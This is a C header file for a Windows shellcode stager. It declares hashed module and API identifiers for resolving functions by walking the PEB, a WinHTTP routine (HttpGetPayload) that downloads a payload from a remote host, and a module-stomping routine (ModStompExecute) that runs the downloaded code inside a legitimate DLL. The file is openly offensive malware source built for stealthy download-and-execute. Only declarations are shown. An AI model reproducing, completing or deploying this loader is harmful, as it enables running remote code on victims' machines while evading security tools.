#ifndef SHELLCODE_H
#define SHELLCODE_H 

/* local headers */
#include "Native.h"
#include <winhttp.h>

#define WIN32_FUNC( x ) __typeof__( x ) * x 
#define MemCopy         __builtin_memcpy

/* casting */
#define C_PTR( x ) ( ( PVOID )    x )
#define U_PTR( x ) ( ( UINT_PTR ) x )

/* Modules */
#define H_MODULE_NTDLL    ( 0x70e61753 )
#define H_MODULE_KERNEL32 ( 0xadd31df0 )

/* Functionns */
#define H_API_LOADLIBRARYA            0xb7072fdb
#define H_API_WINHTTPOPEN             0x613eace5
#define H_API_WINHTTPCONNECT          0x81e0c81d
#define H_API_WINHTTPOPENREQUEST      0xb06d900e
#define H_API_WINHTTPSENDREQUEST      0x7739d0e6
#define H_API_WINHTTPRECEIVERESPONSE  0xae351ae5
#define H_API_WINHTTPREADDATA         0x75064b89
#define H_API_WINHTTPCLOSEHANDLE      0xa7355f15
#define H_API_RTLALLOCATEHEAP         0x3be94c5a
#define H_API_RTLREALLOCATEHEAP       0xaf740371
#define H_API_RTLFREEHEAP             0x73a9e4d7
#define H_API_NTPROTECTVIRTUALMEMORY  0x50e92888

typedef struct _INSTANCE {
  
  /* api function pointers */
  struct {
    /* ntdll */
    WIN32_FUNC( RtlAllocateHeap );
    WIN32_FUNC( RtlReAllocateHeap );
    WIN32_FUNC( RtlFreeHeap );
    WIN32_FUNC( NtProtectVirtualMemory ); 

    /* kernel32 */
    WIN32_FUNC( LoadLibraryA );

    /* winhttp */
    WIN32_FUNC( WinHttpOpen );
    WIN32_FUNC( WinHttpConnect );
    WIN32_FUNC( WinHttpOpenRequest );
    WIN32_FUNC( WinHttpSendRequest );
    WIN32_FUNC( WinHttpReceiveResponse );
    WIN32_FUNC( WinHttpReadData );
    WIN32_FUNC( WinHttpCloseHandle );
  } Win32;

  /* loaded modules */
  struct {
    PVOID Ntdll;
    PVOID Kernel32;
    PVOID WinHttp;
  } Modules; 

} INSTANCE, *PINSTANCE; 

VOID Main(
  VOID
);

PVOID LdrModulePeb(
  _In_ ULONG Hash
);

PVOID LdrFunctionAddr(
  _In_ PVOID Module,
  _In_ ULONG Function
);

BOOL HttpGetPayload(
  _In_  PINSTANCE Instance, 
  _In_  LPWSTR    Host,
  _In_  USHORT    Port, 
  _In_  LPWSTR    Path, 
  _Out_ PVOID*    Payload,
  _Out_ PSIZE_T   Size   
);

VOID ModStompExecute(
  _In_ PINSTANCE Instance,
  _In_ LPWSTR    Dll, 
  _In_ PVOID     Payload, 
  _In_ SIZE_T    Size
); 

#endif // SHELLCODE_H
